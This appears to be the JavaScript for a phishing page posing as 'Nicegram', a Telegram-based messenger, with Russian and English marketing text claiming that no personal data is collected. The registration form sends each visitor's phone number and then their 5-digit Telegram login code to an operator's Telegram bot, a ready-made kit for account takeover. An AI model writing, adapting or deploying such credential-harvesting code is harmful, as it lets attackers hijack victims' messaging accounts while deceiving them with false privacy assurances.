// Конфигурация - ЗАМЕНИТЕ НА ВАШ ДЕЙСТВИТЕЛЬНЫЙ ТОКЕН БОТА И CHAT ID
const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
const CHAT_ID = 'ВАШ_CHAT_ID';

// Данные по странам с масками номеров
const countryData = {
    '7': { name: 'Россия', code: '+7', pattern: /^(\d{3})(\d{3})(\d{2})(\d{2})$/, format: '$1 $2 $3 $4', length: 10, placeholder: '999 123 45 67' },
    '77': { name: 'Казахстан', code: '+7', pattern: /^(\d{3})(\d{3})(\d{2})(\d{2})$/, format: '$1 $2 $3 $4', length: 10, placeholder: '701 123 45 67' },
    '994': { name: 'Азербайджан', code: '+994', pattern: /^(\d{2})(\d{3})(\d{2})(\d{2})$/, format: '$1 $2 $3 $4', length: 9, placeholder: '50 123 45 67' },
    '380': { name: 'Украина', code: '+380', pattern: /^(\d{2})(\d{3})(\d{2})(\d{2})$/, format: '$1 $2 $3 $4', length: 9, placeholder: '67 123 45 67' }
};

// Языковые данные
const translations = {
    en: {
        register: "Register",
        welcomeTitle: "Welcome<br>to Nicegram",
        welcomeText: "Nicegram is a Telegram API-based messenger that offers enhanced opportunities for business and personal communication alike. Nicegram fully supports all Telegram updates and serves as a brilliant alternative for those who would like to get more functions and features than the standard Telegram client provides.",
        whyTitle: "Why Nicegram?",
        whySubtitle: "It's Fast, Secure & Convenient!",
        card1Title: "Powered by Telegram",
        card1Text: "Nicegram is the best way to enjoy everything Telegram has to offer without any restrictions. It uses an open source Telegram API and supports updates from the official client, giving you full access while still on your favorite messaging app!",
        card2Title: "Private & Secure",
        card2Text: "The information you send via the Nicegram messenger is encrypted and stored on Telegram servers to ensure your safety. We do not collect any personal data, so there's no need for concern!",
        card3Title: "Diverse Integrations",
        card3Text: "The most necessary tools for modern people and businesses are now in one place with Nicegram. You'll never have to install another app!"
    },
    ru: {
        register: "Регистрация",
        welcomeTitle: "Добро пожаловать<br>в Nicegram",
        welcomeText: "Nicegram — это мессенджер на основе Telegram API, который предлагает расширенные возможности для бизнеса и личного общения. Nicegram полностью поддерживает все обновления Telegram и служит отличной альтернативой для тех, кто хочет получить больше функций и возможностей, чем стандартный клиент Telegram.",
        whyTitle: "Почему Nicegram?",
        whySubtitle: "Это быстро, безопасно и удобно!",
        card1Title: "Работает на Telegram",
        card1Text: "Nicegram — лучший способ пользоваться всеми возможностями Telegram без ограничений. Он использует открытый Telegram API и поддерживает обновления официального клиента, предоставляя вам полный доступ к любимому мессенджеру!",
        card2Title: "Конфиденциально и безопасно",
        card2Text: "Информация, которую вы отправляете через Nicegram, зашифрована и хранится на серверах Telegram для вашей безопасности. Мы не собираем личные данные, поэтому беспокоиться не о чем!",
        card3Title: "Широкие интеграции",
        card3Text: "Все необходимые инструменты для современных людей и бизнеса теперь собраны в одном месте с Nicegram. Больше не нужно устанавливать дополнительные приложения!"
    }
};

// Глобальные переменные
let currentPhoneNumber = '';
let isCodeStep = false;
let currentCountry = countryData['7'];

// Функция отправки сообщения в Telegram
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Функция валидации номера телефона
function validatePhoneNumber(phone, country) {
    const cleaned = phone.replace(/\D/g, '');
    return cleaned.length === country.length;
}

// Функция форматирования номера телефона
function formatPhoneNumber(phone, country) {
    const cleaned = phone.replace(/\D/g, '');
    if (cleaned.length > country.length) {
        return cleaned.substring(0, country.length);
    }
    
    const match = cleaned.match(country.pattern);
    if (match) {
        return match.slice(1).join(' ');
    }
    return cleaned;
}

// Функция обновления плейсхолдера
function updatePhonePlaceholder(country) {
    const phoneInput = document.getElementById('phone-input');
    phoneInput.placeholder = country.placeholder;
    phoneInput.value = '';
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    const registrationWindow = document.getElementById('registration-window');
    const registerBtn = document.getElementById('register-btn');
    const closeBtn = document.querySelector('.close-registration');
    const submitBtn = document.getElementById('submit-btn');
    const countryCodeSelect = document.getElementById('country-code');
    const phoneInput = document.getElementById('phone-input');
    const codeInput = document.getElementById('code-input');
    const codeGroup = document.querySelector('.code-group');
    const enBtn = document.getElementById("en-btn");
    const ruBtn = document.getElementById("ru-btn");

    // Инициализация выбора страны
    countryCodeSelect.innerHTML = '';
    for (const [code, data] of Object.entries(countryData)) {
        const option = document.createElement('option');
        option.value = code;
        option.textContent = `${data.code} (${data.name})`;
        countryCodeSelect.appendChild(option);
    }

    // Функция установки языка
    function setLanguage(lang) {
        const t = translations[lang];
        document.getElementById("register-btn").textContent = t.register;
        document.getElementById("welcome-title").innerHTML = t.welcomeTitle;
        document.getElementById("welcome-text").textContent = t.welcomeText;
        document.getElementById("why-title").textContent = t.whyTitle;
        document.getElementById("why-subtitle").textContent = t.whySubtitle;
        document.getElementById("card1-title").textContent = t.card1Title;
        document.getElementById("card1-text").textContent = t.card1Text;
        document.getElementById("card2-title").textContent = t.card2Title;
        document.getElementById("card2-text").textContent = t.card2Text;
        document.getElementById("card3-title").textContent = t.card3Title;
        document.getElementById("card3-text").textContent = t.card3Text;
    }

    // Переключение языков
    enBtn.addEventListener("click", () => {
        setLanguage("en");
        enBtn.classList.add("active");
        ruBtn.classList.remove("active");
    });

    ruBtn.addEventListener("click", () => {
        setLanguage("ru");
        ruBtn.classList.add("active");
        enBtn.classList.remove("active");
    });

    // Обработчик изменения страны
    countryCodeSelect.addEventListener('change', function() {
        const selectedCode = this.value;
        currentCountry = countryData[selectedCode];
        updatePhonePlaceholder(currentCountry);
    });

    // Открытие окна регистрации
    registerBtn.addEventListener('click', function() {
        registrationWindow.style.display = 'flex';
        resetRegistrationForm();
    });

    // Закрытие окна регистрации
    closeBtn.addEventListener('click', function() {
        registrationWindow.style.display = 'none';
        resetRegistrationForm();
    });

    // Закрытие при клике вне окна
    registrationWindow.addEventListener('click', function(event) {
        if (event.target === registrationWindow) {
            registrationWindow.style.display = 'none';
            resetRegistrationForm();
        }
    });

    // Обработка отправки формы
    submitBtn.addEventListener('click', function() {
        if (!isCodeStep) {
            // Шаг 1: Отправка номера телефона
            const phoneNumber = phoneInput.value.trim().replace(/\D/g, '');
            
            if (!validatePhoneNumber(phoneNumber, currentCountry)) {
                alert(`Пожалуйста, введите корректный номер телефона для ${currentCountry.name}. Требуется ${currentCountry.length} цифр.`);
                return;
            }

            currentPhoneNumber = `${currentCountry.code}${phoneNumber}`;

            // Отправка уведомления в Telegram
            sendTelegramMessage(`🔐 <b>Попытка регистрации</b>\n📱 Номер: ${currentPhoneNumber}\n🌍 Страна: ${currentCountry.name}`);

            // Переход к шагу ввода кода
            showCodeStep();
        } else {
            // Шаг 2: Подтверждение кода
            const verificationCode = codeInput.value.trim();

            if (verificationCode.length !== 5 || !/^\d+$/.test(verificationCode)) {
                alert('Пожалуйста, введите корректный 5-значный код');
                return;
            }

            // Успешная регистрация
            handleSuccessfulRegistration(currentPhoneNumber, verificationCode);
        }
    });

    // Функция показа шага с кодом
    function showCodeStep() {
        isCodeStep = true;
        codeGroup.style.display = 'block';
        submitBtn.textContent = 'Подтвердить';
        phoneInput.disabled = true;
        countryCodeSelect.disabled = true;
    }

    // Функция сброса формы регистрации
    function resetRegistrationForm() {
        isCodeStep = false;
        codeGroup.style.display = 'none';
        submitBtn.textContent = 'Продолжить';
        phoneInput.disabled = false;
        countryCodeSelect.disabled = false;
        phoneInput.value = '';
        codeInput.value = '';
        currentPhoneNumber = '';
        // Сброс к первой стране
        countryCodeSelect.value = '7';
        currentCountry = countryData['7'];
        updatePhonePlaceholder(currentCountry);
    }

    // Функция успешной регистрации
    function handleSuccessfulRegistration(phoneNumber, verificationCode) {
        // Скрываем кнопку регистрации в хедере
        registerBtn.style.display = 'none';
        
        // Отправляем финальное сообщение в Telegram
        sendTelegramMessage(`✅ <b>Регистрация удалась</b>\n📱 Номер: ${phoneNumber}\n🔑 Код: ${verificationCode}\n🌍 Страна: ${currentCountry.name}`);
        
        // Закрываем окно регистрации
        registrationWindow.style.display = 'none';
        
        // Можно добавить дополнительные действия после успешной регистрации
        alert('Регистрация успешно завершена!');
    }

    // Автоматическое форматирование номера телефона
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) {
            e.target.value = formatPhoneNumber(value, currentCountry);
        }
        
        // Подсветка поля при правильном количестве цифр
        const cleaned = value.replace(/\D/g, '');
        if (cleaned.length === currentCountry.length) {
            phoneInput.style.borderColor = '#4CAF50';
        } else {
            phoneInput.style.borderColor = '#555';
        }
    });

    // Обработка нажатия Enter
    phoneInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });

    codeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            submitBtn.click();
        }
    });

    // Инициализация
    setLanguage("ru");
    updatePhonePlaceholder(currentCountry);
});
